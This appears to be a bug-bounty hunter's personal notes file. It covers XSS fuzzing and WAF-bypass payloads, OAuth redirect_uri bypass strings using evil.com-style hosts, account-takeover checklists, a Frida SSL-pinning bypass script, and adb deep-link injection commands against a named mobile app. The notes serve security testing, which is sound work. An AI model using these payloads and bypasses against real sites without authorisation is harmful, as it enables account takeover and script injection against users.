# XSS
- 80% of time spent in **debugger** 
- what the browser shows in inspect is after all the decoding and permutations 
- how to find the event handlers (best way):
```js
Object.keys(window).filter(k => !k.indexOf('on'))
```
- do *more* DOM + postMessage 
	- first look for these:
		- *window.open*
		- *window.location*
		- *window.location.href*
# **FUZZ the whitespaces allowed** 
- [ ] (re read js for hackers)
- FUZZ for *HTML tags*
	- <img{fuzz}>src{fuzz}onerror=test
```js
const div = document.createElement('div'); const result = [];
const worked = p => result.push(p); for (let i=0;i<=0x10ffff; ++i)
{ div.innerHTML = `<img${String.fromCodePoint(i)}src${String.fromCodePoint(i)}onerror=worked(${i})>` } document.body.appendChild(div);
```
- FUZZ for *JS scheme*
	- javascript{FUZZ} also java{FUZZ}script 
		- (%0a, %0d,%09) (you must know)
	- {FUZZ}javascript ...
```js
log=[]; let anchor =document.createElement('a'); for(let i=0;i<0x10ffff; i++){ anchor.href = `javascript${String.fromCodePoint(i)};`; if (anchor.protocol === 'javascript:'){ log.push(i) } }
```
# **bypass**
- [ ] known waf ? -> search the net 
- [ ] CDN or application based ? -> build your own payload
- [ ] JS protection ? -> debug
- Do not use noisy Strings  
	- `<x> -> <x onxxx -> <x onxxx= `
### in HTML tags
- [ ] fuzz to find a valid tag
- [ ] *<ta[FUZZ]g> (it will gets valid server side)* #gold (***change after ruleset is a killer***)
- [ ] waf confusion 
	- [ ] *use HTML encoding* #gold
		- [ ] `<img src onerror=alert(1)` -> 403
		- [ ] `<img src>` -> 200
		- [ ] `<img src> onerror=alert(1)` -> 200
		- [ ] `<img src &#x3E onerror=alert(1)>` -> 200
```js
<!--` <img/src` onerror=alert(origin)> --!>
<img src="/" =_='' title="onerror='prompt(origin)'" >
<!<script>confirm(origin)</script>
```
### in JS execution
##### alert,prompt,etc (WORDS) are filtered ? 
- [ ] confuse
```js
- [](`cons`+`tructor`)(`const`+`ructor`)(`aler`+`t(origin)`)()
```
- [ ] payload in fragment part
```js
  location=location.hash.split('#')(1) // #javascript:alert(origin)
```
- [ ] unicode encode the js syntax
	- [ ] \u{0061}
	- [ ] \u{000000000000000000000061}
##### paranthesis,brackets,func() etc are filtered?
- [ ] **alert?.(origin)** -> use `?`
- [ ] window.valueOf=alert;window+1 -> **parentheses-less payloads**

### PostMessage
- doesn't generate http req => burp doesn't capture 
- search for EventListeners 
- Chrome (not burp's)
- important properties 
	- e.source ->  *we cannot forge* 
	- e.origin -> *we cannot forge* 
	  (`e.origin === 'https://google.com'` is not vulnerable)
	- e.data
- **EXPLOIT**: `postmessage developer tool` + `DOM invader` (post message interception)
	- post your message + **Spoof Origin**  + **build POC** 
		- ==window.open (opens pop-up)==
		- iframe ALWAYS GETS DENIED
	- dom invader gets refreshed everytime, `postmessage developer tool` doesnt
	- dom invader doesnt detect listeners in app
	- BUT *if a message sent dominvader captures it* + you must test messages for each listener manually (source code)
	  - ==best way to trace== ? => search for unique string and debug in debugger

#TODO 
- [**Waf Evasion Techniques**](https://blog.isec.pl/waf-evasion-techniques/)
- [An Interesting XSS-Bypassing WAF](https://labs.cognisys.group/posts/An-Intresting-XSS-Bypassing-WAF/)


# FUZZing
- sanding maformed|unexpected HTTP reqs
- to trigger unexpected behavior
- to discover hidden|unlinked  resources 
	- files
	- parameter
	- header
- you should balance the fuzzing condition
- ===***FOLLOW the LEAST CHANGE principle***=== (no kermanshaahi hack :)
### hidden resources
- unlinked directories|files
- development|testing environments
- API endpoints
- config files
### tools 
- FFUF
- ***[recollapse](https://github.com/0xacb/recollapse)***
- crunch
- hand
- GAP
	- use value replacement -> observe interesting behavior(reflection|change|malfunction) -> *reduce* and change values to exploit 
- fallparams 
	- discover parameters at first and filterout (leach:) 
- x8 | Arjun
- paramMiner
	- mess with the configs -> goes to target tree 
	- its wordlist is goated
- IIS shortname scanner
### checking phase
- ===**check the reliability of fuzzing**===
	- find a ***hook*** (static files are better)
	- verify the fuzzing by the hook (my pov: *dont use automatic filtering*)
- repeat  
-  testing your hook: 
```bash
wList_maker() {
    seq 1 100 > list.tmp
    echo $1 >> list.tmp
    seq 101 300 >> list.tmp
    echo $1 >> list.tmp
    seq 301 600 >> list.tmp
} #you MUST filter out all then find your hook when fuzzing -> -mc all -fs [something] => Now thats a good FUZZ
```
### inputs
- WAF, **checker function**, restriction, validation, etc bypass
- use *[recollapse](https://github.com/0xacb/recollapse)*
- Ranges 
	- 0x00, 0x2F
	- 0x3A, 0x40
	- 0x5B, 0x60
### files
1. recognize the *Web Server architecture*
2. recognize the *filename patterns*
	- login.php
	- loginUser.php
	- LoginUser.php
	- user_count.php => FUZZlowercase_ FUZZlowercase.php
3. FUZZ for JS files
4. FUZZ on status codes
### endpoints
- => function()
- Flask, Rails,Express,etc are route-based
- use Ffuf for normal fuzzing *partially* 
-  `/api/users/all`
	- `/api/users/FUZZ`
	- `/api/FUZZ/all`
	- `/api/FUZZ`  
- again ... you MUST use a hook
- **FOLLOW THE LEAST CHANGE PRINCIPLE**
### parameters
- query string parameters can be increased, as long as the server handles the request (in average 25 -> 40 params)
- the number of parameters included in each HTTP request is called a ***chunk***
	- smaller chunk => improves discovery
- fuzz on various *status codes* (including 404 -> web application)
- fuzzing *headers is similar to fuzzing parameters*, nothing special
- fuzz with both *GET and POST* HTTP methods
#### magic parameters
- every web app has hidden parameters
	- Findable in web app
	- *similar to other parameter names*
		- yahoo_home_url -> yahoo_home_redirect
		- use_local_engine -> reflects into engine json object
			- ? -> frontend json object
			- use_FUZZ_engine -> use_remote_engine
	- totally new
- ==**programmers use the same parameter names on different pages**==
	- (e.g all params -> unfurl (extract params) -> use elsewhere)
- **where**? 
	- all HTTP req parameters
	- HTML form names + ids + etc
	- JS variable names
	- JSON object in js files
- example ? 
	- (passive (waymore + paramSpider)(`inurl:? || inurl:&`) + active (manually like GAP + automated like x8 + fallparams))
	-  (e.g manual GAP -> replace values -> interesting behavior | e.g automated x8)
	- *MANUALL is ALWASY BETTER* (false positive)
```bash
param_maker() {
    filename="$1"
    value="$2"
    counter=0
    query_string=""

    while IFS= read -r keyword
    do
        if [ -n "$keyword" ]
        then
            counter=$((counter+1))
            query_string="${query_string}${keyword}=${value}${counter}&"
        fi

        if [ $counter -eq 25 ]
        then
            echo "${query_string%?}"
            query_string=""
            counter=0
        fi
    done < "$filename"

    if [ $counter -gt 0 ]
    then
        echo "${query_string%?}"
    fi
}
```
### wordlist
- generic ->
   best: assetnote's **[wordlist_with_underscore.txt](https://wordlists-cdn.assetnote.io/data/manual/wordlist_with_underscores.txt)** 
   then paramminer
- make you own 
	- 3(.-_ included) & 4 alphanumeric ->  crunch
	- ASCII characters are good to fuzz
	- **PATERNS** again
	- gather wordlists by Hand

### over CDN 
- lower your threads + delay
- capture by burp => add the corresponding headers
- proxy through burp + turn on HTTP2  
# Authentication
- [ ] narrow recon 
	- [ ] look for JS (+FUZZ.js)
	- [ ] search in DOMs for endpoints 
	- [ ] fuzzing with wordlist 
		- [ ] registration 
		- [ ] while logged in
### registration 
- [ ] special accounts (specially in cases when the asset is not core)
	- [ ] `noreply@github.com`
	- [ ] `support@company.com`
- [ ] instant login after inregisteration
	- [ ] `victim@gmail.com%0a` _(%0a means 0 - 20 HEX)_
	- [ ] `victim+a@gmail.com`
- [ ] confirmation link ?
	- [ ] verification bypass
- [ ] no registeration? => narrow recon
### sign in
- [ ] test over 100 page => pattern 
- [ ] determine the pattern look for ==custom ones==
- [ ] try to manipulate the flow'
### 2FA 
### OAuth
- [ ] providers (ONLY for unknown providers)
	- [ ] code expiratinon
	- [ ] multi-app code
	- [ ] redirect uri handling
- [ ] check all oauth channels
- [ ] abnormal or custom behavior ?
- [ ] redirect_uri flaws
	- [ ] fixed (host or path ?)
	- [ ] dynamic (host or path ?)
	- [ ] **Bypass**
		- [ ] <mark style="background: #FFF3A3A6;">chinese dot </mark>(`。`) => **`%3E%80%82`**
			- [ ] `///evil%3E%80%82com`
			- [ ] `evil.com.target.com`
		- [ ] FUZZ
		- [ ] `target.com%25%2eEvil.com`
		- [ ] `target.com%09Evil.com`
- [ ] state parameter
	- [ ] DO NOT BE AFRAID :)
		- [ ] exists or not ?
		- [ ] valid or not ?
		- [ ] *state reuse*
	- [ ] attacker grabs au thorization code and forces the victim to open it.
		- [ ] *if the user is already authenticated* => link account
- [ ] evil application
	- [ ] race condition 
		- [ ] code -> access_token
		- [ ] refresh_token -> access_token
	- [ ] after access is revoked, code should be revoked
- [ ] premission manipulation
	- [ ] revoke email access  
	- [ ] scope parameter manipulation
	       change prems (LEAST CHANGE) to generate exceptions
### forget password
### link account 
- several accounts tied to same user (aka merges the accounts)
- ==**confirmation HTTP request**== 
- methods
	- [ ] OAuth methods 
	- [ ] email verification
- attacks?
	- [ ] CSRF the final request 
		- [ ] **Modern CSRF**: 
		- [ ] ==deep links==
			-  where to look more?
				- [ ] switch between different environmnets (mobile,desktop,...)
		- [ ] ==hDOM==
### **transfer (2 apps  1login/1not_login)** (NO OAUTH)
- custom implementations
- senarios:
	- [ ] redirect URL to grab token
	- [ ] CORS (rare)
	- [ ] JSONP call (insecure by default)
	- [ ] top level cookies (.domain)
	- [ ] **==confirmation HTTP request==** **[[Live Hunts#Authneticarion transfer bug between mac app and webappz | Senario for multiple 1 click ATO on capcup]]**
- [ ] how does the app manages to redirect back the users ?
- [ ]  find the flaw in the flow
### other schemes

# Mobile pentest
## installation
- [ ] genymotion
- [ ] an android machine (like galaxy s9) 
- [ ] frida
	- [ ] `pip install frida-tools`
	- [ ] server download (`github.com/frida/frida`)
		-  hook -> runtime memory modification (on the server)
- [ ] adb
	- [ ] connect it to android (connect using `adb shell`)
- [ ] jadx
	- decompiling APKs
- [ ] drozer
	- exploiring more attack surfaces
## android
- [ ] installing GApps from genymotion 
	- [ ] for x86 arm use `genymotion_ARM_translation`
## traffic capture
- [ ] **Traffic Capture**
  - [ ] **Exporting DER certificate from BurpSuite**
    - [ ] Export Burp CA certificate in DER format

  - [ ] **Adding the certificate to system certificates**
    - [ ] Convert DER to PEM
      - [ ] `openssl x509 -inform DER -in burp.der -out burp.pem`
    - [ ] Get old-style subject hash
      - [ ] `openssl x509 -inform PEM -subject_hash_old -in burp.pem | head -1`
    - [ ] Rename certificate using hash
      - [ ] `mv burp.pem 9a5ba575.0`
    - [ ] Push certificate to device storage
      - [ ] `adb push 9a5ba575.0 /sdcard/`
    - [ ] Move certificate to system CA store
      - [ ] `mv /sdcard/9a5ba575.0 /system/etc/security/cacerts/`

    - [ ] **Error handling (read-only system)**
      - [ ] Check mount status
        - [ ] `cat /proc/mounts | grep system`
      - [ ] Remount system as read-write
        - [ ] `adb shell mount -o rw,remount /dev/block/by-name/system /`
      - [ ] Move the certificate again
        - [ ] `mv /sdcard/9a5ba575.0 /system/etc/security/cacerts/`

    - [ ] Set correct ownership
      - [ ] `chown root:root /system/etc/security/cacerts/9a5ba575.0`
    - [ ] Set correct permissions
      - [ ] `chmod 644 /system/etc/security/cacerts/9a5ba575.0`
    - [ ] Reboot device

  - [ ] **Installing proxy on Genymotion**
    - [ ] Configure HTTP/HTTPS proxy settings
### trick
- if the application shows any kind of: 
	- [ ] Error
	- [ ] loading noance (due to ssl-pinning)
	- [ ] checker function (obstacles)
- [ ] disable the proxy and make it go away :)
- [ ] Drop the mentioned request
- [ ] NO ? --> Frida (you need to discover where you got stuck) => thats a lot of work
## decompiling
- extract and deobfuscation of apk's source code
- [ ] jadx file.apk
- [ ] jadx-gui file.apk --deobf
## attack surfaces
- [ ] content-type -> simpler
- [ ] verb tamper
- [ ] cookie
- [ ] different domain
## dynamic hook
- [ ] **Dynamic Hook**
  - [ ] Push Frida server to device
    - [ ] `adb push frida-server /data/local/tmp/`
  - [ ] Set executable permission
    - [ ] `chmod +x /data/local/tmp/frida-server`
  - [ ] Start Frida server
    - [ ] `adb shell`
      - [ ] `./data/local/tmp/frida-server`

  - [ ] List running processes on device
    - [ ] `frida-ps -U`
    - [ ] `adb shell pm list packages | grep [name]`

  - [ ] Attach Frida script to target app
    - [ ] `frida -U -l script.js -f com.myapp.name`

  - [ ] **SSL Pinning Bypass**
  - this might be endpoint or application wide
    - [ ] Run universal SSL pinning bypass
      - [ ] `frida -U -l script.js -f com.myapp.name`

> [!note] universal ssl pin bypass
```java
Java.perform(function() {
    var array_list = Java.use("java.util.ArrayList");
    var ApiClient = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    // Cert pin bypass by https://techblog.mediaservice.net/2018/11/universal-android-ssl-pinning-bypass-2/
    ApiClient.checkTrustedRecursive.implementation = function(a1,a2,a3,a4,a5,a6) {
        console.log('Bypassing SSL Pinning');
        var k = array_list.$new();
        return k;
    }

    var WebView = Java.use('android.webkit.WebView');
    WebView.loadUrl.overload("java.lang.String").implementation = function (s) {
        console.log('Enable webview debug for URL: ' + s.toString());
        this.setWebContentsDebuggingEnabled(true);
        this.loadUrl.overload("java.lang.String").call(this, s);
    }
},0);
```
### trick
- [ ] set timeout the script in order to wait for its execution and give time to frida to load it peoperly
## links
- [ ] **Static**
	- [ ] decompiling the APK
	- [ ] using regex to extract links 
- [ ] **Dynamic**
	- [ ] running the application
	- [ ] ==hooking the string class==
> [!note] strings.js 
> - `frida -U -l strings.js -f com.myapp.name` 
```java
Java.perform(function () {
    Java.use('java.lang.StringBuffer').toString.implementation = function () {
        var res = this.toString();
        if (res != null) {
            tmp = res.toString();
            //if (tmp.indexOf('capcut:') > -1 || tmp.indexOf('https:') > -1) {
            console.log("++++++++++++++++++++++");
            console.log(tmp);
            //}
        }
        return res;
    }
});
```
> [!todo] **#TODO hook JavaScipt's Strings in the browser to find dynamic links on the flow** 
## deep links

> [!abstract] definition
> scheme which application registers, when the user opens it, application behaves in certain way
> - link -> running an activity + inputs
> - [`scheme://host/`] -> manifest file
> - `scheme://host/[path?QS]`-> in codes
> 

- Network tab in Chorom is a nice place to find em . 
- How to test if the deep link you captured in requests actually exists?
  - [ ] serach in android manifest of apk
  - [ ] use adb
	- [ ] `adb shell am start -d 'capcut://main/web?web_url=https://hackerone.com'`
	- [ ] `adb shell am start -d 'capcutlogin://oauthresponse/web?web_url=https://google.com'`
	- [ ] `adb shell am start -d 'capcut://main/web_trans?web_url=https://google.com'`
- where to prioritize?
	- [ ] switch between <mark style="background: #D2B3FFA6;">different apps or environmnets</mark> (mobile,desktop,...)?
	- [ ] does it send <mark style="background: #D2B3FFA6;">token</mark>? (yes => vulnerable)
		- [ ] test common bypasses
		- [ ]  source code review
	- [ ] does it sends <mark style="background: #D2B3FFA6;">#authorized-request</mark>? 
	    - **(yes => golden place)**
		    - [ ] chain with places when there is checker function (whitelist based)
			    - [ ] OAUTH's redirect_url 
			- [ ] look for <mark style="background: #D2B3FFA6;">sensitive HTTP requests</mark> 
				- bind account
				- change password
				- delete account
				- [ ] ==**can be CSRFed?**== -> use the #authorized-request from before -> take the url that cannot be csrfed in normal way and replace it with the authorized-request's url => ALL THE HEADER GETS SEND HERE  #gold
	    - NO?
			- [ ] different urls
			- [ ] try bypasses
